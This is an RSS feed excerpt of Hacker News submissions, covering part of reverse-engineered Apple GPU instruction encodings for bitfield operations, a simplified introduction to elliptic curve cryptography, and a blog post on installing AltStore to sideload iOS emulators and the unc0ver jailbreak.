<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table><table><thead><tr><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="2">m1</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="4">At</td><td colspan="6">A</td></tr></tbody></table><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td></tr></thead><tbody><tr><td colspan="1">m3</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="2">Cx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">m2</td><td colspan="4">Ct</td><td colspan="6">C</td></tr></tbody></table></div><div><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">m3</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="2">Cx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">m2</td><td colspan="4">Ct</td><td colspan="6">C</td><td colspan="2">m1</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="4">At</td><td colspan="6">A</td><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table></div>
<pre>D = ALUDst(Dx:D, Dt)
A = ALUSrc(Ax:A, At)
B = ALUSrc(Bx:B, Bt)
C = ALUSrc(Cx:C, Ct)
m = m3:m2:m1

for each active thread:
  a = A[thread]
  b = B[thread]
  c = C[thread]

  shift_amount = (c &amp; 0x7F)

  if m == 0:
    mask = 0xFFFFFFFF
  else:
    mask = (1 &lt;&lt; m) - 1

  result = (a &amp; ~(mask &lt;&lt; shift_amount)) | ((b &amp; mask) &lt;&lt; shift_amount)

  D[thread] = result
</pre>
<h3>bfeil (Bitfield Extract and Insert Low/Shift Right)</h3>
<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">1</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table><table><thead><tr><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="2">m1</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="4">At</td><td colspan="6">A</td></tr></tbody></table><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td></tr></thead><tbody><tr><td colspan="1">m3</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="2">Cx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">m2</td><td colspan="4">Ct</td><td colspan="6">C</td></tr></tbody></table></div><div><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">m3</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="2">Cx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">m2</td><td colspan="4">Ct</td><td colspan="6">C</td><td colspan="2">m1</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="4">At</td><td colspan="6">A</td><td colspan="1">1</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table></div>
<pre>D = ALUDst(Dx:D, Dt)
A = ALUSrc(Ax:A, At)
B = ALUSrc(Bx:B, Bt)
C = ALUSrc(Cx:C, Ct)
m = m3:m2:m1

for each active thread:
  a = A[thread]
  b = B[thread]
  c = C[thread]

  shift_amount = (c &amp; 0x7F)

  if m == 0:
    mask = 0xFFFFFFFF
  else:
    mask = (1 &lt;&lt; m) - 1

  result = (a &amp; ~mask) | ((b &gt;&gt; shift_amount) &amp; mask)

  D[thread] = result
</pre>
<h3>extr (Extract From Register Pair)</h3>
<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table><table><thead><tr><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="2">m1</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="4">At</td><td colspan="6">A</td></tr></tbody></table><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td></tr></thead><tbody><tr><td colspan="1">m3</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="2">Cx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">m2</td><td colspan="4">Ct</td><td colspan="6">C</td></tr></tbody></table></div><div><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>2‚Ä¶</td></tr></thead></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dougallj.github.io/applegpu/docs.html">https://dougallj.github.io/applegpu/docs.html</a></em></p>]]>
            </description>
            <link>https://dougallj.github.io/applegpu/docs.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134462</guid>
            <pubDate>Sun, 14 Feb 2021 17:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[(Very) Basic Intro to Elliptic Curve Cryptography]]>
            </title>
            <description>
<![CDATA[
Score 203 | Comments 39 (<a href="https://news.ycombinator.com/item?id=26134240">thread link</a>) | @wagslane
<br/>
February 14, 2021 | https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>Elliptic curve cryptography is a modern <a aria-label=" (opens in a new tab)" href="https://searchsecurity.techtarget.com/definition/public-key" target="_blank" rel="noreferrer noopener nofollow">public-key&nbsp;encryption&nbsp;</a>technique based on mathematical elliptic curves and is well-known for creating smaller, faster, and more efficient cryptographic keys. For example, <a aria-label=" (opens in a new tab)" href="https://bitcoin.org/" rel="noreferrer noopener nofollow" target="_blank">Bitcoin</a> uses ECC as its asymmetric cryptosystem because of its lightweight nature.</p>
<p>In this introduction to ECC, I want to focus on the high-level ideas that make <a aria-label="ECC (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography" target="_blank">ECC</a> work. For the purposes of keeping this article easier to digest, I‚Äôll omit implementation details and mathematical proofs, we can save those for another time.</p>
<h2>What is elliptic curve cryptography used&nbsp;for?</h2>
<p>A common use of ECC is to encrypt data so that only authorized parties can decrypt it. This has several obvious use cases but is most often used to encrypt internet traffic. For example, on the <a href="https://qvault.io/">Qvault web app</a> I could used ECC to encrypt a verification email so that no one but the recipient can read the message.</p>
<h2>ECC is public-key cryptography</h2>
<p>There are many types of public-key cryptography, and Elliptic Curve Cryptography is just one flavor. Other algorithms include <a aria-label="RSA (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">RSA</a>, <a aria-label="Diffie-Helman (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange" target="_blank">Diffie-Helman</a>, etc. Let‚Äôs go over a quick background of public-key cryptography as a jumping-off point, so that I can discuss ECC and build on top of these ideas. By all means, study more in-depth on public-key cryptography when you have the time.</p>
<p>Public-key cryptography allows the following to happen:</p>

<p>We create two keys, a public key, and a private key. The public key is given freely, and any party can encrypt data by using it. However, the private key is kept secret and only those who hold it will have the ability to decrypt data.</p>
<h2>An example of public-key cryptography</h2>
<p>Let‚Äôs pretend that Facebook is going to receive a private post from Donald Trump. Facebook needs to be able to ensure that when the ex-president sends his post over the internet, no one in the middle (Like the NSA, or an internet service provider) can read the message. The entire exchange using public-key cryptography would go like this:</p>
<ul><li>Donald Trump Notifies Facebook that he wants to send them a private post</li><li>Facebook sends Donald Trump their public key</li><li>Donald Trump uses the public key to encrypt his post:</li></ul>
<p><em>‚ÄúI love Fox and Friends‚Äù + Public Key = ‚Äús80s1s9sadjds9s‚Äù</em></p>
<ul><li>Donald Trump sends only the encrypted message to Facebook</li><li>Facebook uses its private key to decrypt the message:</li></ul>
<p><em>‚Äús80s1s9sadjds9s‚Äù + Private Key = ‚ÄúI love Fox and Friends‚Äù</em></p>
<p>As you can see, this form of encryption can be quite useful. Here are some key points:</p>
<ul><li>The public key can safely be sent to anyone. It‚Äôs public.</li><li>The private key must be kept safe because if someone in the middle were to get the private key, they could decrypt messages.</li><li>Computers can quickly use the public key to encrypt a message, and quickly use the private key to decrypt a message.</li><li>Computers require a <em>very</em> long time (millions of years) to derive the original data from the encrypted message if they don‚Äôt have the private key.</li></ul>
<h2>How it Works: The Trapdoor&nbsp;Function</h2>
<p>The crux of all public-key cryptographic algorithms is that they each have their own unique trapdoor function<strong>. </strong>A trapdoor function is a function that can only be computed one way, or at least can only be computed one way <em>easily</em> (in less than millions of years using modern computers).</p>
<h3>Not a trapdoor function:</h3>
<p><code>A + B = C</code></p>
<p>If I‚Äôm given A and B I can compute C. However, if I‚Äôm given B and C I can also compute A. This is not a trapdoor function.</p>
<h3>Trapdoor function:</h3>
<p><code>"I love Fox and Friends‚Äù + Public Key --&gt; s80s1s9sadjds9s</code></p>
<p>If given <em>‚ÄúI love Fox and Friends‚Äù</em> and the public key, I can produce <code>s80s1s9sadjds9s</code>, but if given <code>s80s1s9sadjds9s</code> and the Public Key I can‚Äôt produce <em>‚ÄúI love Fox and Friends‚Äù</em></p>
<p>In RSA, which is arguably the most widely used public-key cryptosystem, the trapdoor function relies on how hard it is to factor large numbers into their prime factors.</p>
<p><strong>Public Key:</strong> <code>944,871,836,856,449,473</code></p>
<p><strong>Private Key:</strong> <code>961,748,941</code> and <code>982,451,653</code></p>
<p>In the example above the public key is a very large number, and the private key is the two prime factors of the public key. This is a good example of a Trapdoor Function because it is very easy to multiply the numbers in the private key together to get the public key, but if all you have is the public key it will take a very long time using a computer to re-create the private key.</p>
<p><em>Note: In real cryptography, the private key would need to be 200+ digits long to be considered secure.</em></p>
<h2>What Makes Elliptic Curve Cryptography Different?</h2>
<p>You would use ECC for the same reasons as RSA. ECC and RSA both generate a public and private key and allow two parties to communicate securely. One advantage to ECC however, is that a 256-bit key in ECC offers about the same security as a 3072-bit key using RSA. ECC allows resource-constrained systems like smartphones, embedded computers, and cryptocurrency networks to use ~10% of the storage space and bandwidth required by RSA.</p>
<h2>ECC‚Äôs Trapdoor&nbsp;Function</h2>
<p>This is probably why most of you are here. The trapdoor function is what makes ECC special and different than RSA. The trapdoor function is similar to a mathematical game of pool.</p>
<p>First, we start with an arbitrary point on the curve. Next, we use the dot function to find a new point. Finally, we keep repeating the dot function to hop around the curve until we finally end up at our last point. Let‚Äôs walk through the algorithm.</p>

<ul><li>Starting at <code>A</code>:</li><li><code>A dot B = -C</code> (Draw a line from A to B and it intersects at -C)</li><li>Reflect across the X-axis from -C to C</li><li><code>A dot C = -D</code> (Draw a line from A to C and it intersects -D)</li><li>Reflect across the X-axis from -D to D</li><li><code>A dot D = -E</code> (Draw a line from A to D and it intersects -E)</li><li>Reflect across the X-axis from -E to E</li></ul>
<p>This is a great trapdoor function because if you know where the starting point (A) is and how many hops are required to get to the ending point (E), it‚Äôs very easy to find the ending point. On the other hand, if all you know is where the starting point and ending point are, it‚Äôs nearly impossible to find how many hops it took to get there.</p>
<p>Public Key: Starting Point A, Ending Point E</p>
<p>Private Key: Number of hops from A to E</p>
<h2>Questions?</h2>
<p>Here are a few questions I had when I first learned about ECC. Hopefully, I can address them properly.</p>
<h3>1. How is the second point found? If the dot function is basically drawing a line between two points, don‚Äôt you need a second point to start&nbsp;with?</h3>
<p>No. The second point (we will call it -R below) is actually the result of P dot P (let‚Äôs assume the first point is called P)</p>
<p><code>P dot P = -R</code></p>
<p>So what is <code>P dot P</code>? It is actually just the tangent line of P. See the graphic below:</p>

<h3>2. What happens if the dot function produces a line that will go way off out to some&nbsp;extreme?</h3>
<p>If the line doesn‚Äôt hit the curve close to the origin, we can actually define a maximum X value where the line will wrap back around and start from the beginning again. See the graphic below for an example.</p>

<h3>3. If the number of hops is the private key, can‚Äôt I just count the hops until I hit the endpoint?</h3>
<p>Nope! The number of hops is <em>very</em> large, something like <code>2^256</code>. It would take far too long to compute each hop one by one, for example <code>p dot p dot p dot p ...</code>.</p>
<p>If however, you know the number of hops you can use an <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring" target="_blank" aria-label="exponentiation (opens in a new tab)" rel="noreferrer noopener nofollow">exponentiation</a> trick to find the ending point quite quickly. For example, and omitting the details of elliptic curve operations: <code>2P = P dot P</code> and then <code>4P = 2P dot 2P</code>. This allows you to get up to those crazy high calculations exponentially faster.</p>
<h2>Who Cares?</h2>
<p>ECC is used as the cryptographic key algorithm in Bitcoin because it potentially can save ~90% of the resources used by a similar RSA system. It seems that each year we see more systems moving from RSA to a more modern elliptic curve approach.</p>
<div><div>
<h2>Thanks For Reading!</h2>
<p>If you‚Äôre interested in furthering your CS career, take our <a href="https://qvault.io/">computer science courses</a></p>
<p>Follow and hit us up on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments, and if we‚Äôve made a mistake be sure to <a href="https://qvault.io/contact/">let us know</a> so we can get it corrected!</p>
<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our newsletter for more programming articles</p>
</div></div>
<h2>Related Articles</h2>
<ul><li><a href="https://qvault.io/2020/01/29/hashing-passwords-python-cryptography-examples/">Hashing Passwords ‚Äì Python Cryptography Examples</a></li><li><a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">How SHA-2 Works Step-By-Step (SHA-256)</a></li><li><a href="https://qvault.io/2019/07/09/is-aes-256-quantum-resistant/">Is AES-256 Quantum Resistant?</a></li></ul>
 </div></div>]]>
            </description>
            <link>https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134240</guid>
            <pubDate>Sun, 14 Feb 2021 17:33:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AltStore: Alternative App Store Unlocks Limitless Possibilities]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26134234">thread link</a>) | @scottbucks
<br/>
February 14, 2021 | https://www.thedetechtor.com/post/altstore-on-ios | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/altstore-on-ios">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.17.5"><div dir="ltr"><div><h3 id="viewer-foo"><span><span>An alternative App Store that unlocks many possibilities&nbsp;</span></span></h3><div id="viewer-6jooe"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Screenshot of the AltStore homepage"><p><img data-pin-url="https://www.thedetechtor.com/post/altstore-on-ios" data-pin-media="https://static.wixstatic.com/media/f361a8_8b477d096f5348c1a0093e3d43392f1f~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/f361a8_8b477d096f5348c1a0093e3d43392f1f~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Screenshot of the AltStore homepage"></p></div><p><span dir="auto">Source: the AltStore website</span></p></div></div></div><p id="viewer-3n39k"><span>Recently I discovered the AltStore, created by <a href="http://rileytestut.com/" target="_blank" rel="noopener"><u>Riley Testut</u></a>, <!-- -->an iOS app developer who has for years worked on mobile video game emulation. The AltStore is<!-- --> an alternative to the App Store on iOS giving you many new possibilities for your iPhone, like jailbreaking, downloading emulators and sideloading&nbsp;.ipa apps you can find on the internet. In this article, I'm going to explain how you can get your hands on the AtlStore and what you can then do with it.</span></p><h3 id="viewer-iluk"><span>Downloading the AltStore to your iOS&nbsp;device</span></h3><p id="viewer-9v239"><span>The AltStore is super easy to download however you will need to do this via a Mac or Pc.</span></p><p id="viewer-63fm5"><span>Here are a few <strong>requirements</strong> before downloading:</span></p><ol><li id="viewer-3vp1j"><p>You need to be running MacOS 10.14.4 and up or Windows 10</p></li><li id="viewer-8cii5"><p>If you are on windows you need to have iTunes and iCloud downloaded on your Pc from <a href="http://apple.com/" target="_blank" rel="noopener"><strong><u>apple.com</u></strong></a> (it must be from <a href="http://apple.com/" target="_blank" rel="noopener"><u>apple.com</u></a> and not the windows version).</p></li><li id="viewer-fjh87"><p>And finally, your iOS device must be running iOS 12.2 and up for AltStore to work.</p></li></ol><p id="viewer-bi01i"><span>Now let us get into how we <strong>download</strong> AltStore:</span></p><ol><li id="viewer-bhgm2"><p>First, you will need to download the AltServer from the AltStore website <a href="https://altstore.io/" target="_blank" rel="noopener"><u>here</u></a>.</p></li><li id="viewer-ae64a"><p>You will then need to open that .zip file then on windows, you will follow the setup wizard and on Mac, you will need to drag the AltStore to your Applications file.</p></li><li id="viewer-30qbv"><p>Once you open the application you will need to install the mail plugin on your Mac (this step is only for Mac users)</p></li><li id="viewer-dugfb"><p>And finally, plug in your device to your computer and make sure to trust the computer so you can install the AtlStore App on it and you'll have to put in your Apple ID: (for windows users this will be in your bottom right toolbar)</p></li></ol><div id="viewer-1ha5a"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/altstore-on-ios" data-pin-media="https://static.wixstatic.com/media/f361a8_00154ad6c7804210b75900d52b09d34d~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.jpg" src="https://static.wixstatic.com/media/f361a8_00154ad6c7804210b75900d52b09d34d~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-2rreu"><span>   5. Now that it's on your device you'll need to trust the app by going to setting &gt; general &gt; device management &gt; tap on your Apple ID &gt; tap trust.</span></p><p id="viewer-efs7e"><span>   6. And you're good to go!</span></p><p id="viewer-9k4ea"><span>If you have any trouble installing the AltStore to your device I recommend watching <a href="https://www.youtube.com/watch?v=yLuyVakPpUM" target="_blank" rel="noopener"><u>this video</u></a> by OPERATIONiDROID. </span></p><h3 id="viewer-b9i9v"><span><span>More from The Detechtor:</span></span></h3><ul><li id="viewer-7kv29"><p><strong>üöÑ </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-bdsh5"><p><strong>‚åöÔ∏è </strong><a href="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" target="_blank" rel="noopener"><strong><u>Fitness Trackers: Helping us Get Fit or Just Another Gadget?</u></strong></a></p></li><li id="viewer-9jtab"><p><strong>üì± </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ‚ôªÔ∏è</strong></p></li></ul><h3 id="viewer-evc3s"><span>Now, what can you do with the Altstore?</span></h3><p id="viewer-edpr1"><span>As I previously mentioned, the AltStore allows you to sideload any IPA app that you downloaded from the internet that isn't normally available in the regular App Store. </span></p><p id="viewer-daans"><span>Here are some of the apps that I recommend:</span></p><p id="viewer-f3ulp"><span><strong>Delta</strong></span></p><div id="viewer-2g2ak"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Screenshot of the Delta app on iPhone"><p><img data-pin-url="https://www.thedetechtor.com/post/altstore-on-ios" data-pin-media="https://static.wixstatic.com/media/a27d24_bb2a72963ed54e439bd8aae5604c2bf8~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/a27d24_bb2a72963ed54e439bd8aae5604c2bf8~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Screenshot of the Delta app on iPhone"></p></div><p><span dir="auto">Screenshot of the Delta app on iPhone</span></p></div></div></div><p id="viewer-dq38b"><span>If you're interested in retro gaming one of the best emulators is Delta, developed by Riley Testut (also the developer of the AltStore) it allows you to play classic games in your pocket from systems such as Nintendo Entertainment System, Super Nintendo Entertainment System, Nintendo 64, Game Boy (Color), Game Boy Advance and many more to come! </span></p><p id="viewer-2i01a"><span>If you're not a fan of the touch screen controls, Delta also supports PS4 and Xbox  One controllers, all MFI game controllers and also Bluetooth keyboard and mouse.</span></p><p id="viewer-5c06t"><span>You can also easily save and load save states for any game from the pause menu. Or you can even Sync your games, game saves, save states, cheats, controller skins, and controller mappings between devices using Google Drive or Dropbox. </span></p><p id="viewer-7dn5n"><span><strong>Dolphin iOS</strong></span></p><div id="viewer-84nre"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Screenshot of the Dolphin IOS app on iPhone "><p><img data-pin-url="https://www.thedetechtor.com/post/altstore-on-ios" data-pin-media="https://static.wixstatic.com/media/a27d24_4d463bf89bb6447aa42c8163c9c7d593~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.jpg" src="https://static.wixstatic.com/media/a27d24_4d463bf89bb6447aa42c8163c9c7d593~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Screenshot of the Dolphin IOS app on iPhone "></p></div><p><span dir="auto">Screenshot of the Dolphin IOS app on iPhone </span></p></div></div></div><p id="viewer-degkq"><span>Dolphin iOS is built on the code of the Dolphin emulator for Mac and Pc allowing you to play Wii and Gamecube games directly on your iOS device. </span></p><p id="viewer-3rne1"><span>Like Delta, you can use a controller to play your favourite games and you can save and load save states however you do not get the possibility to sync.</span></p><p id="viewer-2hio0"><span>I personally am a huge fan of this app and have had great fun playing some Wii games however if you are going to download ROMS from the internet, they must be of games you have previously owned.</span></p><p id="viewer-g65l"><span>If you want to see the app in action, check out <a href="https://www.youtube.com/watch?v=Kztd8S0nzVw" target="_blank" rel="noopener"><u>this video</u></a> by Snazzy Labs where he downloads it on to an iPad Pro 2020.</span></p><p id="viewer-568cf"><span><strong>Unc0ver</strong></span></p><p id="viewer-3e4n3"><span><span>Unc0ver is a jailbreak, which means that you can have the freedom to do whatever you would like to do to your iOS device. Allowing you to change what you want and operate within your purview, unc0ver unlocks the true power of your iDevice.</span></span></p><p id="viewer-k0v9"><span><span>Unc0ver supports iOS 11.0 through to iOS 13.5.5 Beta 1 (Excluding 13.5.1) and is considered one of the safest and easiest to use jailbreaks available. If you want to experiment with tweaking your iOS device this is the jailbreak I recommend.</span></span></p><p id="viewer-cgfo1"><span><span>If you want more information about the unc0ver jailbreak and a step by step guide on how to set it up, check out </span><a href="https://www.youtube.com/watch?v=HGHQ5R3NwrA" target="_blank" rel="noopener"><u>this video</u></a><span> by Linus Tech Tips. </span></span></p><h3 id="viewer-bk4ob"><span><span>More from The Detechtor:</span></span></h3><ul><li id="viewer-1ubbk"><p><strong>üöÑ </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-8dd38"><p><strong>‚åöÔ∏è </strong><a href="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" target="_blank" rel="noopener"><strong><u>Fitness Trackers: Helping us Get Fit or Just Another Gadget?</u></strong></a></p></li><li id="viewer-3lnfl"><p><strong>üì± </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ‚ôªÔ∏è</strong></p></li></ul><h3 id="viewer-io40"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-451kv"><p>üì© Want the latest on the impact of tech? <strong>Subscribe</strong> to our <strong>newsletter</strong>!</p></li><li id="viewer-e8ibc"><p>üéô <strong>NEW</strong>! <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><u>The Detechtor Podcast</u></a> is now available on all podcast players!                                 <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><u>Apple Podcasts</u></a> | <a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><u>Spotify</u></a> | <a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><u>Google Podcasts</u></a> | <a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><u>Stitcher</u></a> | <a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><u>Tunein</u></a></p></li><li id="viewer-2udel"><p>üì≤ Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><u>Instagram</u></a> | 